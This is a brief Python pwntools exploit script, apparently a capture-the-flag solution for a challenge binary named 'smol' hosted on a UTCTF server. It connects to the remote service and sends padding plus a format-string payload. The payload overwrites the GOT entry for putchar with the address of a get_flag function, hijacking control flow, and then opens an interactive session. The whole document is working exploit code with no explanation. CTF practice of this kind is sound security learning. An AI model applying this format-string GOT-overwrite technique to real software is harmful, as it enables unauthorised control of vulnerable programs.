from pwn import *

# p = process('./smol')
p = remote('pwn.utctf.live', 5004)
e = context.binary = ELF('./smol')

payload = b'A' * 0x70
payload += fmtstr_payload(20, {e.got['putchar']:e.symbols['get_flag']})

p.sendline(payload)
p.sendline()
p.interactive()
